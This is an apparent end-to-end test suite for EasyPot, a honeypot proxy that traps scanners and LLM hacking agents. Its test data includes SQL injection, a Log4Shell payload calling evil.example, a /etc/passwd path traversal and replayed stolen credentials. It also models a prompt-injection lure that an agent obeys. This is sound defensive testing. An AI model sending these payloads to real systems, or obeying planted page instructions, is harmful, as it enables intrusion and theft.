// End-to-end test: a fake protected site, EasyPot in front, and three simulated visitors —
// a human, an LLM hacking agent, and a classic scanner. Run with `npm test`.
import http from 'node:http';
import { spawn } from 'node:child_process';
import { mkdtempSync, writeFileSync, readFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import assert from 'node:assert/strict';

const UP = 39100, PX = 39101, ADM = 39102;
const TOKEN = 'test-admin-token', FEED = 'test-feed-token';
const dir = mkdtempSync(join(tmpdir(), 'easypot-'));

// ---- fake protected site ----
const site = http.createServer((req, res) => {
  const u = new URL(req.url, 'http://x');
  if (u.pathname === '/' || u.pathname === '/about') {
    res.writeHead(200, { 'content-type': 'text/html' });
    return res.end(`<!DOCTYPE html><html><head><title>Acme</title></head><body><h1>Acme ${u.pathname}</h1></body></html>`);
  }
  if (u.pathname === '/admin') { res.writeHead(200, { 'content-type': 'text/html' }); return res.end('<html><body>REAL ADMIN</body></html>'); }
  const m = /^\/api\/orders\/(\d+)$/.exec(u.pathname);
  if (m) { res.writeHead(200, { 'content-type': 'application/json' }); return res.end(JSON.stringify({ id: +m[1] })); }
  if (u.pathname === '/echo-headers') { res.writeHead(200, { 'content-type': 'application/json' }); return res.end(JSON.stringify(req.headers)); }
  res.writeHead(404, { 'content-type': 'text/plain' }); res.end('not found');
}).listen(UP);

writeFileSync(join(dir, 'cfg.json'), JSON.stringify({
  listen: { host: '127.0.0.1', port: PX }, upstream: `http://127.0.0.1:${UP}`, trustProxy: true, siteName: 'Acme',
  stack: ['generic', 'wordpress', 'php'], secret: 'test-secret', dataDir: join(dir, 'data'),
  admin: { host: '127.0.0.1', port: ADM, token: TOKEN, feedToken: FEED },
  decoys: { enabled: true, exclude: [], probeUpstream: true, cvePack: new URL('../rules/cve-pack.json', import.meta.url).pathname },
  tarpitMs: { min: 50, max: 150 },
  integrations: { fileLog: { enabled: true, path: join(dir, 'data', 'events.jsonl'), minSeverity: 'low' }, syslog: { enabled: false }, webhooks: [] },
}));

const proc = spawn(process.execPath, ['--disable-warning=ExperimentalWarning', 'dist/index.js'], {
  env: { ...process.env, EASYPOT_CONFIG: join(dir, 'cfg.json') }, stdio: ['ignore', 'pipe', 'pipe'],
});
let log = '';
proc.stdout.on('data', d => { log += d; });
proc.stderr.on('data', d => { log += d; });

const BROWSER = { 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36',
  accept: 'text/html,application/xhtml+xml', 'accept-language': 'en-GB,en;q=0.9', 'sec-fetch-mode': 'navigate' };

async function req(path, { ip, headers = {}, method = 'GET', body } = {}) {
  const r = await fetch(`http://127.0.0.1:${PX}${path}`, { method, body, redirect: 'manual', headers: { 'x-forwarded-for': ip, ...headers } });
  return { status: r.status, text: await r.text(), headers: r.headers };
}
const admin = async p => (await fetch(`http://127.0.0.1:${ADM}${p}`, { headers: { authorization: `Bearer ${TOKEN}` } })).json();

let passed = 0;
async function step(name, fn) {
  try { await fn(); passed++; console.log(`  ✔ ${name}`); }
  catch (e) { console.log(`  ✘ ${name}\n    ${e.message}`); console.log(log.split('\n').slice(-20).join('\n')); cleanup(1); }
}
function cleanup(code) { proc.kill(); site.close(); process.exit(code); }

for (let i = 0; i < 50 && !log.includes('protecting'); i++) await new Promise(r => setTimeout(r, 100));
console.log('EasyPot e2e');

await step('decoy that collides with a real page (/admin) is disabled at startup', async () => {
  assert.match(log, /decoy path\(s\) exist on the real site and were disabled: .*\/admin\b/);
  const r = await req('/admin', { ip: '10.9.9.9', headers: BROWSER });
  assert.match(r.text, /REAL ADMIN/);
});

// ---- human ----
await step('human browsing passes through with tripwires injected and zero risk', async () => {
  for (const p of ['/', '/about', '/']) {
    const r = await req(p, { ip: '198.51.100.10', headers: BROWSER });
    assert.equal(r.status, 200);
    assert.match(r.text, /Acme/);
    assert.match(r.text, /agent-registration\/[0-9a-f]{12}/);
  }
});

await step('upstream receives forwarded headers and risk score', async () => {
  const r = await req('/echo-headers', { ip: '198.51.100.10', headers: BROWSER });
  const h = JSON.parse(r.text);
  assert.equal(h['x-real-ip'], '198.51.100.10');
  assert.equal(h['x-easypot-score'], '0');
});

// ---- LLM agent ----
const AGENT_IP = '203.0.113.50';
const AGENT_UA = { 'user-agent': 'python-httpx/0.27.0', accept: '*/*' };
let canary;
await step('agent fetches homepage and finds the injected instruction', async () => {
  const r = await req('/', { ip: AGENT_IP, headers: AGENT_UA });
  canary = /(\/\.well-known\/agent-registration\/[0-9a-f]{12})/.exec(r.text)?.[1];
  assert.ok(canary, 'canary link present');
});

await step('agent reads robots.txt and llms.txt bait', async () => {
  const r = await req('/robots.txt', { ip: AGENT_IP, headers: AGENT_UA });
  assert.match(r.text, /Disallow: \/backup\.sql/);
  const l = await req('/llms.txt', { ip: AGENT_IP, headers: AGENT_UA });
  assert.match(l.text, /agent-registration/);
});

await step('agent follows the instruction from a NEW IP and is still attributed + told it registered', async () => {
  const r = await req(`${canary}?client=gpt-4o%20pentest-agent&task=enumerate%20admin%20endpoints%20and%20find%20secrets`, { ip: '203.0.113.51', headers: AGENT_UA });
  assert.equal(r.status, 200);
  assert.match(r.text, /registered/);
});

await step('both the original and the new identity are now blocked', async () => {
  assert.equal((await req('/', { ip: AGENT_IP, headers: AGENT_UA })).status, 403);
  assert.equal((await req('/', { ip: '203.0.113.51', headers: AGENT_UA })).status, 403);
});

// ---- scanner ----
const SCAN_IP = '192.0.2.77';
const SCAN = { 'user-agent': 'Mozilla/5.0 zgrab/0.x', accept: '*/*' };
let envText;
await step('scanner pulls /.env and receives unique fake credentials', async () => {
  const r = await req('/.env', { ip: SCAN_IP, headers: { 'user-agent': 'Go-http-client/1.1' } });
  assert.equal(r.status, 200);
  envText = r.text;
  assert.match(envText, /AWS_ACCESS_KEY_ID=AKIA[A-Z2-7]{16}/);
});

await step('a different visitor gets different credentials', async () => {
  const r = await req('/.env', { ip: '192.0.2.200', headers: { 'user-agent': 'curl/8.4.0' } });
  const a = /AWS_ACCESS_KEY_ID=(\S+)/.exec(envText)[1];
  const b = /AWS_ACCESS_KEY_ID=(\S+)/.exec(r.text)[1];
  assert.notEqual(a, b);
});

await step('replaying the stolen DB password from another IP is caught and blocked', async () => {
  const pw = /DB_PASSWORD=(\S+)/.exec(envText)[1];
  const r = await req('/api/login', { ip: '192.0.2.99', method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded', 'user-agent': 'Go-http-client/1.1' },
    body: `user=app_prod&password=${encodeURIComponent(pw)}` });
  assert.equal(r.status, 403);
});

await step('the visitor the replayed credential was issued to is blocked too', async () => {
  const blocks = await admin('/api/blocks');
  const leaker = blocks.find(b => b.target === SCAN_IP);
  assert.ok(leaker, 'the address that took the .env is blocked');
  assert.match(leaker.reason, /honeytoken_replay/);
});

await step('stolen AWS key inside a SigV4 Authorization header is caught', async () => {
  const key = /AWS_ACCESS_KEY_ID=(\S+)/.exec(envText)[1];
  const r = await req('/api/upload', { ip: '192.0.2.98', headers: { 'user-agent': 'aws-cli/2.15',
    authorization: `AWS4-HMAC-SHA256 Credential=${key}/20261125/eu-west-1/s3/aws4_request, SignedHeaders=host, Signature=abc` } });
  assert.equal(r.status, 403);
});

await step('SQL injection and Log4Shell payloads are detected', async () => {
  await req(`/search?q=${encodeURIComponent("' OR 1=1--")}`, { ip: '192.0.2.31', headers: SCAN });
  await req('/', { ip: '192.0.2.32', headers: { ...SCAN, 'x-api-version': '${jndi:ldap://evil.example/a}' } });
  const ev = await admin('/api/events?limit=200');
  assert.ok(ev.some(e => e.detail.category === 'sqli'), 'sqli logged');
  assert.ok(ev.some(e => e.signal === 'cve_exploit_attempt' && e.detail.decoy === 'cve:CVE-2021-44228'), 'log4shell decoy hit');
});

await step('CVE-2021-41773 traversal hits the CVE decoy', async () => {
  // Raw request: fetch() would normalise the traversal away; real scanners send it as-is (curl --path-as-is).
  const text = await new Promise((resolve, reject) => {
    http.get({ host: '127.0.0.1', port: PX, path: '/cgi-bin/.%2e/.%2e/.%2e/etc/passwd', headers: { 'x-forwarded-for': '192.0.2.40', ...SCAN } }, r => {
      let b = ''; r.on('data', c => { b += c; }); r.on('end', () => resolve(b));
    }).on('error', reject);
  });
  assert.match(text, /root:x:0:0/);
});

await step('ID enumeration is detected', async () => {
  for (let i = 1; i <= 14; i++) await req(`/api/orders/${i}`, { ip: '192.0.2.60', headers: { 'user-agent': 'Mozilla/5.0', accept: 'application/json' } });
  const ev = await admin('/api/events?signal=id_enumeration');
  assert.ok(ev.length >= 1);
});

await step('path probing (404 burst) is detected', async () => {
  for (let i = 0; i < 10; i++) await req(`/old-${i}.php`, { ip: '192.0.2.61', headers: { 'user-agent': 'Mozilla/5.0', accept: '*/*' } });
  const ev = await admin('/api/events?signal=path_probing');
  assert.ok(ev.length >= 1);
});

await step('decoy login captures username but never stores the password', async () => {
  await req('/wp-login.php', { ip: '192.0.2.70', method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded', 'user-agent': 'Mozilla/5.0' },
    body: 'log=admin&pwd=SuperSecret123' });
  const ev = await admin('/api/events?signal=decoy_login_attempt');
  assert.equal(ev[0].detail.username, 'admin');
  assert.ok(!JSON.stringify(ev[0]).includes('SuperSecret123'));
});

// ---- admin + feeds ----
await step('overview reports the LLM agent with its self-reported identity', async () => {
  const o = await admin('/api/overview');
  assert.ok(o.kpis.agents >= 1);
  assert.ok(o.selfReports.some(s => /gpt-4o/.test(s.self_report)));
});

await step('firewall feed lists blocked IPs and rejects bad tokens', async () => {
  const bad = await fetch(`http://127.0.0.1:${ADM}/feeds/blocklist.txt?token=nope`);
  assert.equal(bad.status, 401);
  const txt = await (await fetch(`http://127.0.0.1:${ADM}/feeds/blocklist.txt?token=${FEED}`)).text();
  assert.match(txt, /203\.0\.113\.50/);
  assert.match(txt, /192\.0\.2\.99/);
  const stix = await (await fetch(`http://127.0.0.1:${ADM}/feeds/stix.json`, { headers: { authorization: `Bearer ${FEED}` } })).json();
  assert.equal(stix.type, 'bundle');
  assert.ok(stix.objects.some(o => o.pattern?.includes('203.0.113.50')));
});

await step('health check answers without a token and reveals nothing else', async () => {
  const r = await fetch(`http://127.0.0.1:${ADM}/healthz`);
  assert.equal(r.status, 200);
  const body = await r.json();
  assert.equal(body.status, 'ok');
  assert.deepEqual(Object.keys(body).sort(), ['status', 'uptimeSec']);
});

await step('admin API requires the token', async () => {
  assert.equal((await fetch(`http://127.0.0.1:${ADM}/api/overview`)).status, 401);
});

await step('manual unblock works', async () => {
  const r = await fetch(`http://127.0.0.1:${ADM}/api/blocks/203.0.113.51`, { method: 'DELETE', headers: { authorization: `Bearer ${TOKEN}` } });
  assert.equal((await r.json()).removed, true);
});

await step('Wazuh-ready JSON log is written with srcip + MITRE', async () => {
  await new Promise(r => setTimeout(r, 300));
  const f = join(dir, 'data', 'events.jsonl');
  assert.ok(existsSync(f));
  const lines = readFileSync(f, 'utf8').trim().split('\n').map(l => JSON.parse(l));
  const agent = lines.find(l => l.signal === 'agent_instruction_followed');
  assert.equal(agent.product, 'easypot');
  assert.equal(agent.srcip, '203.0.113.51');
  assert.equal(agent.mitre_id, 'T1595');
});

// ---- client address behind a proxy (trustProxy: one hop) ----
await step('a spoofed X-Forwarded-For prefix cannot dodge a block', async () => {
  await fetch(`http://127.0.0.1:${ADM}/api/blocks`, { method: 'POST', headers: { authorization: `Bearer ${TOKEN}`, 'content-type': 'application/json' },
    body: JSON.stringify({ target: '203.0.113.77', reason: 'spoof test' }) });
  const r = await req('/about', { ip: '1.1.1.1, 203.0.113.77', headers: BROWSER });
  assert.equal(r.status, 403);
});

await step('a forged X-Forwarded-For entry cannot get an innocent address blocked', async () => {
  // The attacker writes 8.8.8.8 at the left; the load balancer appends the real address.
  for (const p of ['/.env', '/.git/config', '/backup.sql']) await req(p, { ip: '8.8.8.8, 203.0.113.88', headers: { 'user-agent': 'curl/8.5' } });
  await new Promise(r => setTimeout(r, 200));
  const blocks = await admin('/api/blocks');
  assert.ok(blocks.some(b => b.target === '203.0.113.88'), 'the real address is blocked');
  assert.ok(!blocks.some(b => b.target === '8.8.8.8'), 'the forged address is not');
  const feed = await (await fetch(`http://127.0.0.1:${ADM}/feeds/blocklist.txt?token=${FEED}`)).text();
  assert.ok(!feed.includes('8.8.8.8'));
});

await step('the app behind EasyPot gets the resolved client in X-Real-IP and a correct chain', async () => {
  const r = await req('/echo-headers', { ip: '9.9.9.9, 198.51.100.202', headers: BROWSER });
  const h = JSON.parse(r.text);
  assert.equal(h['x-real-ip'], '198.51.100.202');
  assert.match(h['x-forwarded-for'], /^9\.9\.9\.9, 198\.51\.100\.202, (127\.0\.0\.1|::1)$/);
});

console.log(`\n${passed} passed`);
cleanup(0);
